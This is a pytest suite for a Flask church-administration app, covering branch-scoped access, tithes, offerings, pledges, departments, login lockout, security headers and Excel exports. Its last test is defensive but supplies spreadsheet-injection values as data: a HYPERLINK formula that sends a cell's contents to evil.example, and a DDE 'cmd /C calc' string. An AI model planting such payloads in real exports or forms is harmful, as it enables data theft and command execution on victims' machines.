from datetime import date, timedelta

import pytest

from app import create_app
from app.config import TestConfig
from app.extensions import db
from app.models import Branch, HomeChurch, Member, User


@pytest.fixture()
def client():
    app = create_app(TestConfig)
    with app.app_context():
        db.create_all()
        for i, code, name in [(1, "LAIM", "HQ"), (2, "KOR", "Korrompoi"), (3, "MIL", "Milimani"), (4, "MAT", "Matuu")]:
            db.session.add(Branch(id=i, code=code, name=name))
        db.session.flush()
        acacia = HomeChurch(branch_id=1, name="Acacia", area="Acacia")
        tumaini = HomeChurch(branch_id=2, name="Tumaini", area="Korrompoi")
        db.session.add_all([acacia, tumaini])
        db.session.flush()
        db.session.add_all(
            [
                Member(branch_id=1, first_name="Samuel", last_name="Mutiso", gender="M", dob=date(1985, 5, 1), marital_status="Married", home_church_id=acacia.id),
                Member(branch_id=1, first_name="Faith", last_name="Kioko", gender="F", dob=date(2004, 1, 1), home_church_id=acacia.id),
                Member(branch_id=2, first_name="Peter", last_name="Sankale", gender="M", dob=date(1990, 1, 1), home_church_id=tumaini.id),
            ]
        )
        for email, role, bid, cell in [("bishop@t", "bishop", 1, None), ("sec@t", "secretary", 1, None), ("pastor2@t", "pastor", 2, None), ("cell@t", "cell_leader", 1, acacia.id)]:
            u = User(email=email, name=email, role=role, branch_id=bid, cell_id=cell)
            u.set_password("password-123")
            db.session.add(u)
        db.session.commit()
        yield app.test_client()
        db.session.remove()


def login(client, email):
    r = client.post("/api/auth/login", json={"email": email, "password": "password-123"})
    assert r.status_code == 200, r.json
    return {"Authorization": f"Bearer {r.json['access_token']}"}


def last_sunday():
    t = date.today()
    return t - timedelta(days=(t.weekday() + 1) % 7)


def test_login_rejects_bad_password(client):
    assert client.post("/api/auth/login", json={"email": "sec@t", "password": "nope"}).status_code == 401


def test_branch_scoping(client):
    bishop = client.get("/api/members", headers=login(client, "bishop@t")).json
    pastor = client.get("/api/members", headers=login(client, "pastor2@t")).json
    assert len(bishop) == 3
    assert [m["full_name"] for m in pastor] == ["Peter Sankale"]
    hq_id = next(m["id"] for m in bishop if m["branch_id"] == 1)
    assert client.get(f"/api/members/{hq_id}", headers=login(client, "pastor2@t")).status_code == 403


def test_groups(client):
    rows = {m["full_name"]: m["group"] for m in client.get("/api/members", headers=login(client, "bishop@t")).json}
    assert rows["Samuel Mutiso"] == "fathers"
    assert rows["Faith Kioko"] in ("junior_youth", "teens")


def test_tithe_and_duplicate_mpesa(client):
    h = login(client, "sec@t")
    body = {"member_id": 1, "date": date.today().isoformat(), "amount": 1000, "method": "mpesa", "reference": "ujk4h7x2pq"}
    assert client.post("/api/tithes", json=body, headers=h).status_code == 201
    r = client.post("/api/tithes", json={**body, "member_id": 2}, headers=h)
    assert r.status_code == 409 and r.json["field"] == "reference"
    r = client.post("/api/tithes", json={**body, "reference": "123"}, headers=h)
    assert r.status_code == 422
    assert client.post("/api/tithes", json={**body, "member_id": 3, "reference": "UAAAAAAAA1"}, headers=h).status_code == 403
    rep = client.get("/api/reports/tithe", headers=login(client, "bishop@t")).json
    assert rep["total"] == 1000 and rep["tithers"] == 1


def test_only_secretary_writes(client):
    body = {"member_id": 3, "date": date.today().isoformat(), "amount": 500, "method": "cash"}
    assert client.post("/api/tithes", json=body, headers=login(client, "pastor2@t")).status_code == 403
    assert client.post("/api/tithes", json=body, headers=login(client, "bishop@t")).status_code == 403


def test_offering_counts(client):
    h = login(client, "sec@t")
    r = client.post("/api/offerings", json={"date": last_sunday().isoformat(), "counts": {"1000": 2, "50": 3, "1": 4}, "mpesa_total": 1500}, headers=h)
    assert r.status_code == 201
    assert r.json["cash_total"] == 2154 and r.json["total"] == 3654
    assert client.post("/api/offerings", json={"date": last_sunday().isoformat()}, headers=h).status_code == 409
    assert client.post("/api/offerings", json={"date": (last_sunday() - timedelta(days=1)).isoformat()}, headers=h).status_code == 422


def test_pledge_balance(client):
    h = login(client, "sec@t")
    p = client.post("/api/pledges", json={"member_id": 1, "amount": 5000, "due_date": (date.today() + timedelta(days=90)).isoformat()}, headers=h).json
    p = client.post(f"/api/pledges/{p['id']}/payments", json={"amount": 3000, "method": "cash"}, headers=h).json
    assert p["paid"] == 3000 and p["balance"] == 2000 and p["status"] == "Partly Paid"
    assert client.post(f"/api/pledges/{p['id']}/payments", json={"amount": 2500, "method": "cash"}, headers=h).status_code == 422


def test_cell_leader(client):
    h = login(client, "cell@t")
    assert client.get("/api/members", headers=h).status_code == 403
    cells = client.get("/api/cells", headers=h).json
    assert [c["name"] for c in cells] == ["Acacia"]
    body = {"date": date.today().isoformat(), "adults": ["Samuel Mutiso"], "children": [], "visitors": 2, "offering": 450, "signed_by": "Leader Name"}
    assert client.post("/api/cell-reports", json=body, headers=h).status_code == 201
    assert client.post("/api/cell-reports", json=body, headers=h).status_code == 409


def test_dashboard_and_exports(client):
    h = login(client, "bishop@t")
    assert client.get("/api/dashboard", headers=h).status_code == 200
    assert client.get("/api/exports/members.xlsx", headers=h).status_code == 200
    assert client.get("/api/exports/tithe-statement/1.pdf", headers=h).status_code == 200
    assert client.get("/api/audit", headers=login(client, "sec@t")).status_code == 403


def test_hq_secretary_sees_only_hq(client):
    from app.extensions import db
    from app.models import Leader, Offering, WorshipTeamMember

    with client.application.app_context():
        db.session.add_all(
            [
                Leader(role="Pastor", member_id=3, branch_id=2, scope="branch"),
                Leader(role="Bishop", member_id=1, branch_id=1, scope="church"),
                WorshipTeamMember(member_id=3, branch_id=2, role="Drummer"),
                WorshipTeamMember(member_id=1, branch_id=1, role="Keyboard"),
                Offering(branch_id=2, date=last_sunday(), counts={}, cash_total=900, mpesa_total=0, bank_total=0),
                Offering(branch_id=1, date=last_sunday(), counts={}, cash_total=500, mpesa_total=0, bank_total=0),
            ]
        )
        db.session.commit()
    hq = login(client, "sec@t")
    kor = login(client, "pastor2@t")
    for h, branch in ((hq, 1), (kor, 2)):
        for url in ("/api/members", "/api/members?branch_id=2", "/api/members?branch_id=1", "/api/worship-team", "/api/offerings?branch_id=2", "/api/cells"):
            rows = client.get(url, headers=h).json
            assert rows, url
            assert {r["branch_id"] for r in rows} == {branch}, (branch, url)
    kor_leaders = {(l["role"], l["branch_id"]) for l in client.get("/api/leaders", headers=kor).json}
    assert kor_leaders == {("Pastor", 2), ("Bishop", 1)}
    hq_leaders = {(l["role"], l["branch_id"]) for l in client.get("/api/leaders", headers=hq).json}
    assert hq_leaders == {("Bishop", 1)}
    member3 = {"first_name": "Peter", "last_name": "Sankale", "gender": "M", "dob": "1990-01-01"}
    assert client.put("/api/members/3", json=member3, headers=hq).status_code == 403
    pledge = client.post("/api/pledges", json={"member_id": 3, "amount": 1000, "due_date": "2027-01-01"}, headers=hq)
    assert pledge.status_code == 403
    assert client.get("/api/members/3", headers=hq).status_code == 403
    assert client.get("/api/members/1", headers=kor).status_code == 403
    dash = client.get("/api/dashboard?branch_id=2", headers=hq).json
    assert [b["branch_id"] for b in dash["by_branch"]] == [1]
    bishop = client.get("/api/members", headers=login(client, "bishop@t")).json
    assert {r["branch_id"] for r in bishop} == {1, 2}


def test_account_locks_after_too_many_wrong_passwords(client):
    from datetime import timedelta

    from app.extensions import db
    from app.models import User, utcnow

    bad = {"email": "sec@t", "password": "wrong-password"}
    unknown = client.post("/api/auth/login", json={"email": "nobody@t", "password": "x"})
    known = client.post("/api/auth/login", json=bad)
    assert unknown.status_code == known.status_code == 401
    assert unknown.json["message"] == known.json["message"] == "Email or password is incorrect."
    for _ in range(18):
        client.post("/api/auth/login", json=bad)
    assert client.post("/api/auth/login", json=bad).status_code == 401
    right = client.post("/api/auth/login", json={"email": "sec@t", "password": "password-123"})
    assert right.status_code == 429 and "Try again" in right.json["message"]
    with client.application.app_context():
        u = User.query.filter_by(email="sec@t").one()
        u.locked_until = utcnow() - timedelta(minutes=1)
        db.session.commit()
    assert client.post("/api/auth/login", json={"email": "sec@t", "password": "password-123"}).status_code == 200


def test_security_headers(client):
    r = client.get("/api/health")
    assert r.headers["X-Content-Type-Options"] == "nosniff"
    assert r.headers["X-Frame-Options"] == "DENY"
    assert r.headers["Cache-Control"] == "no-store"
    pre = {"Access-Control-Request-Method": "POST", "Access-Control-Request-Headers": "authorization,content-type"}
    good = client.options("/api/auth/login", headers={"Origin": "http://localhost:5173", **pre})
    assert good.headers.get("Access-Control-Allow-Origin") == "http://localhost:5173"
    bad = client.options("/api/auth/login", headers={"Origin": "https://evil.example", **pre})
    assert "Access-Control-Allow-Origin" not in bad.headers



def test_bootstrap_creates_clean_start(client):
    from app.extensions import db
    from app.models import Branch, HomeChurch, Leader, Member, User

    app = client.application
    User.query.delete()
    db.session.commit()
    db.session.expunge_all()
    result = app.test_cli_runner().invoke(args=["bootstrap", "--bishop-phone", "0712 345 678", "--cells", "5"])
    assert result.exit_code == 0, result.output
    with app.app_context():
        assert db.session.get(Branch, 5).name == "Lord's Altar Noonkopir"
        roles = sorted(u.role for u in User.query)
        assert roles == ["bishop", "cell_leader", "cell_leader", "cell_leader", "cell_leader", "cell_leader", "secretary"]
        assert HomeChurch.query.filter(HomeChurch.name.like("Home Church %")).count() == 5
        bishop = Leader.query.filter_by(role="Bishop").one()
        assert db.session.get(Member, bishop.member_id).phone == "0712345678"
    line = next(l for l in result.output.splitlines() if "secretary.hq@laim.church" in l)
    password = line.split()[1]
    assert client.post("/api/auth/login", json={"email": "secretary.hq@laim.church", "password": password}).status_code == 200
    again = app.test_cli_runner().invoke(args=["bootstrap", "--bishop-phone", ""])
    assert "Nothing new to create." in again.output


def test_secretary_adds_and_edits_home_church(client):
    hq = login(client, "sec@t")
    r = client.post("/api/cells", json={"name": "Neema", "area": "Kitengela", "leader_member_id": 1}, headers=hq)
    assert r.status_code == 201
    cid = r.json["id"]
    assert client.post("/api/cells", json={"name": "neema", "area": "X"}, headers=hq).status_code == 409
    assert client.post("/api/cells", json={"name": "Other", "area": "X", "leader_member_id": 3}, headers=hq).status_code == 422
    assert client.put(f"/api/cells/{cid}", json={"name": "Neema Cell", "area": "Kitengela East"}, headers=hq).status_code == 200
    names = [c["name"] for c in client.get("/api/cells", headers=hq).json]
    assert "Neema Cell" in names
    assert client.post("/api/cells", json={"name": "X", "area": "Y"}, headers=login(client, "pastor2@t")).status_code == 403
    member = {"first_name": "No", "last_name": "Birthday", "gender": "F", "marital_status": "Single"}
    assert client.post("/api/members", json=member, headers=hq).status_code == 422


def test_member_without_birth_date_does_not_break_pages(client):
    from app.extensions import db
    from app.models import Member

    db.session.add(Member(branch_id=1, title="Bishop Dr.", first_name="Donald", last_name="Mutiso", gender="M"))
    db.session.commit()
    h = login(client, "bishop@t")
    for url in ("/api/dashboard", "/api/members", "/api/exports/members.xlsx", "/api/cells"):
        assert client.get(url, headers=h).status_code == 200, url



def test_offering_for_every_service(client):
    h = login(client, "sec@t")
    tuesday = last_sunday() - timedelta(days=5)
    r = client.post("/api/offerings", json={"date": tuesday.isoformat(), "service": "Evening Prayer Service", "cash_only_total": 2350, "mpesa_total": 400}, headers=h)
    assert r.status_code == 201, r.json
    assert r.json["total"] == 2750 and r.json["service"] == "Evening Prayer Service"
    assert client.post("/api/offerings", json={"date": tuesday.isoformat(), "service": "Evening Prayer Service", "cash_only_total": 10}, headers=h).status_code == 409
    assert client.post("/api/offerings", json={"date": tuesday.isoformat(), "service": "Morning Glory", "cash_only_total": 600}, headers=h).status_code == 201
    assert client.post("/api/offerings", json={"date": tuesday.isoformat(), "service": "Main Service", "cash_only_total": 600}, headers=h).status_code == 422
    assert client.post("/api/offerings", json={"date": tuesday.isoformat(), "service": "Other", "cash_only_total": 600}, headers=h).json["field"] == "service_other"
    assert client.post("/api/offerings", json={"date": tuesday.isoformat(), "service": "Other", "service_other": "Fundraiser", "cash_only_total": 900}, headers=h).json["service"] == "Fundraiser"
    assert client.post("/api/offerings", json={"date": tuesday.isoformat(), "service": "Youth Service"}, headers=h).status_code == 422
    report = client.get("/api/reports/offering", headers=h).json
    assert report["services"] == 3 and report["total"] == 4250
    assert {s["service"] for s in report["by_service"]} == {"Evening Prayer Service", "Morning Glory", "Fundraiser"}
    oid = client.get("/api/offerings?service=Morning Glory", headers=h).json[0]["id"]
    assert client.delete(f"/api/offerings/{oid}", headers=login(client, "pastor2@t")).status_code == 403
    assert client.delete(f"/api/offerings/{oid}", headers=h).status_code == 204


def test_departments_and_leader_login(client):
    sec = login(client, "sec@t")
    members = {m["full_name"]: m["id"] for m in client.get("/api/members", headers=login(client, "bishop@t")).json}
    r = client.post("/api/departments", json={"name": "Media", "description": "Live stream and sound", "leader_member_id": members["Faith Kioko"]}, headers=sec)
    assert r.status_code == 201, r.json
    did = r.json["id"]
    assert r.json["members_count"] == 1
    assert client.post("/api/departments", json={"name": "media"}, headers=sec).status_code == 409
    assert client.post("/api/departments", json={"name": "Ushers", "leader_member_id": members["Peter Sankale"]}, headers=sec).json["field"] == "leader_member_id"
    assert client.post("/api/departments", json={"name": "Ushers"}, headers=login(client, "pastor2@t")).status_code == 403

    issued = client.post(f"/api/departments/{did}/login", json={"email": "media@laim.church"}, headers=sec)
    assert issued.status_code == 200, issued.json
    lead = client.post("/api/auth/login", json={"email": "media@laim.church", "password": issued.json["password"]}).json
    assert lead["user"]["role"] == "dept_leader" and lead["user"]["department_id"] == did
    h = {"Authorization": f"Bearer {lead['access_token']}"}

    assert [x["id"] for x in client.get("/api/departments", headers=h).json] == [did]
    cands = client.get(f"/api/departments/{did}/candidates", headers=h).json
    assert set(cands[0]) == {"id", "name"}
    assert client.post(f"/api/departments/{did}/members", json={"member_id": members["Samuel Mutiso"], "role": "Camera"}, headers=h).status_code == 201
    assert client.post(f"/api/departments/{did}/members", json={"member_id": members["Peter Sankale"]}, headers=h).status_code == 422
    rep = client.post(f"/api/departments/{did}/reports", json={"date": date.today().isoformat(), "title": "Streamed Sunday service", "details": "Two cameras", "people_involved": 4}, headers=h)
    assert rep.status_code == 201 and rep.json["submitted_by"] == "Faith Kioko"
    assert len(client.get(f"/api/departments/{did}/reports", headers=sec).json) == 1

    for url in ("/api/members", "/api/tithes", "/api/offerings", "/api/cells", "/api/cell-reports", "/api/leaders", "/api/inventory", "/api/dashboard", "/api/reports/download/members.xlsx"):
        assert client.get(url, headers=h).status_code == 403, url
    other = client.post("/api/departments", json={"name": "Ushers"}, headers=sec).json["id"]
    assert client.get(f"/api/departments/{other}/members", headers=h).status_code == 403
    assert client.post(f"/api/departments/{other}/reports", json={"date": date.today().isoformat(), "title": "x y"}, headers=h).status_code == 403
    assert client.get(f"/api/departments/{did}", headers=login(client, "pastor2@t")).status_code == 403
    assert client.get("/api/departments", headers=login(client, "pastor2@t")).json == []

    again = client.post(f"/api/departments/{did}/login", json={"email": "media@laim.church"}, headers=sec).json["password"]
    assert again != issued.json["password"]
    assert client.post("/api/auth/login", json={"email": "media@laim.church", "password": issued.json["password"]}).status_code == 401
    assert client.post(f"/api/departments/{other}/login", json={"email": "ushers@laim.church"}, headers=sec).status_code == 422
    client.put(f"/api/departments/{other}", json={"name": "Ushers", "leader_member_id": members["Samuel Mutiso"]}, headers=sec)
    assert client.post(f"/api/departments/{other}/login", json={"email": "media@laim.church"}, headers=sec).status_code == 409
    client.put(f"/api/departments/{did}", json={"name": "Media", "active": False}, headers=sec)
    assert client.post("/api/auth/login", json={"email": "media@laim.church", "password": again}).status_code == 401


def test_reports_download_as_excel(client):
    from io import BytesIO

    from openpyxl import load_workbook

    sec = login(client, "sec@t")
    client.post("/api/offerings", json={"date": last_sunday().isoformat(), "counts": {"1000": 1}}, headers=sec)
    client.post("/api/departments", json={"name": "Media"}, headers=sec)
    for kind in ("members", "tithe", "tithe-by-member", "offering", "pledges", "building-fund", "inventory", "home-church-reports", "home-churches", "departments", "department-reports", "leadership"):
        r = client.get(f"/api/reports/download/{kind}.xlsx?from=2026-01-01", headers=sec)
        assert r.status_code == 200, kind
        load_workbook(BytesIO(r.data))
    pastor_rows = load_workbook(BytesIO(client.get("/api/reports/download/members.xlsx", headers=login(client, "pastor2@t")).data)).active
    assert [row[0].value for row in pastor_rows.iter_rows(min_row=5)] == ["Peter Sankale"]
    wb = load_workbook(BytesIO(client.get("/api/reports/download/everything.xlsx", headers=login(client, "bishop@t")).data))
    assert len(wb.sheetnames) == 12
    assert wb["Offering"]["A5"].value is not None
    assert client.get("/api/reports/download/nothing.xlsx", headers=sec).status_code == 404
    assert client.get("/api/reports/download/members.xlsx", headers=login(client, "cell@t")).status_code == 403


def _limited_app():
    from app import create_app
    from app.config import TestConfig
    from app.extensions import db

    class Config(TestConfig):
        RATELIMIT_ENABLED = True
        TRUST_PROXY = True

    app = create_app(Config)
    with app.app_context():
        db.create_all()
        db.session.add(Branch(id=1, code="LAIM", name="HQ"))
        for email in ("sec@t", "other@t"):
            u = User(email=email, name=email, role="secretary", branch_id=1)
            u.set_password("password-123")
            db.session.add(u)
        db.session.commit()
    return app


def test_wrong_passwords_block_that_device_only():
    app = _limited_app()
    c = app.test_client()
    attacker = {"X-Forwarded-For": "41.90.1.1"}
    office = {"X-Forwarded-For": "41.90.2.2"}
    codes = [c.post("/api/auth/login", json={"email": "sec@t", "password": "guess"}, headers=attacker).status_code for _ in range(6)]
    assert codes == [401] * 5 + [429]
    blocked = c.post("/api/auth/login", json={"email": "sec@t", "password": "password-123"}, headers=attacker)
    assert blocked.status_code == 429 and "15 minutes" in blocked.json["message"]
    assert c.post("/api/auth/login", json={"email": "sec@t", "password": "password-123"}, headers=office).status_code == 200
    assert c.post("/api/auth/login", json={"email": "other@t", "password": "password-123"}, headers=attacker).status_code == 200
    flood = [c.post("/api/auth/login", json={"email": f"x{i}@t", "password": "x"}, headers={"X-Forwarded-For": "41.90.3.3"}).status_code for i in range(31)]
    assert flood[-1] == 429 and flood.count(429) == 1


def test_big_requests_are_refused(client):
    r = client.post("/api/auth/login", data="x" * (1024 * 1024 + 10), content_type="application/json")
    assert r.status_code == 413


def test_logout_and_password_change_end_old_sessions(client):
    first = client.post("/api/auth/login", json={"email": "sec@t", "password": "password-123"}).json
    second = client.post("/api/auth/login", json={"email": "sec@t", "password": "password-123"}).json
    h1 = {"Authorization": f"Bearer {first['access_token']}"}
    assert client.post("/api/auth/logout", json={"refresh_token": first["refresh_token"]}, headers=h1).status_code == 200
    assert client.get("/api/auth/me", headers=h1).status_code == 401
    assert client.post("/api/auth/refresh", headers={"Authorization": f"Bearer {first['refresh_token']}"}).status_code == 401
    import time

    time.sleep(1.1)
    h2 = {"Authorization": f"Bearer {second['access_token']}"}
    changed = client.post("/api/auth/password", json={"current_password": "password-123", "new_password": "new-password-456"}, headers=h2)
    assert changed.status_code == 200 and changed.json["access_token"]
    assert client.get("/api/auth/me", headers=h2).status_code == 401
    assert client.post("/api/auth/refresh", headers={"Authorization": f"Bearer {second['refresh_token']}"}).status_code == 401
    assert client.get("/api/auth/me", headers={"Authorization": f"Bearer {changed.json['access_token']}"}).status_code == 200
    assert client.post("/api/auth/refresh", headers={"Authorization": f"Bearer {changed.json['refresh_token']}"}).status_code == 200


def test_secretary_cannot_reach_other_branch_members_through_side_doors(client):
    with client.application.app_context():
        from app.extensions import db

        u = User(email="sec2@t", name="sec2", role="secretary", branch_id=2)
        u.set_password("password-123")
        db.session.add(u)
        db.session.commit()
    h = login(client, "sec2@t")
    r = client.post("/api/leaders", json={"role": "Spy", "member_id": 1}, headers=h)
    assert r.status_code == 422 and "name" not in r.json
    assert client.post("/api/leaders", json={"role": "Bishop", "member_id": 3}, headers=h).status_code == 422
    gift = client.post("/api/building-fund", json={"member_id": 2, "date": date.today().isoformat(), "amount": 100, "method": "cash"}, headers=h)
    assert gift.status_code == 422 and "contributor" not in gift.json


def test_excel_exports_never_run_formulas(client):
    from io import BytesIO

    from openpyxl import load_workbook

    trap = '=HYPERLINK("http://evil.example/?x="&A1,"Click")'
    r = client.post("/api/cell-reports", json={"date": date.today().isoformat(), "preacher": trap, "signed_by": "+cmd|' /C calc'!A0", "adults": []}, headers=login(client, "cell@t"))
    assert r.status_code == 201
    bishop = login(client, "bishop@t")
    for kind in ("home-church-reports", "everything"):
        wb = load_workbook(BytesIO(client.get(f"/api/reports/download/{kind}.xlsx", headers=bishop).data))
        for ws in wb.worksheets:
            for row in ws.iter_rows():
                for cell in row:
                    assert cell.data_type != "f", (ws.title, cell.coordinate, cell.value)
        ws = wb["Home church reports"]
        assert trap in [c.value for c in ws[5]]
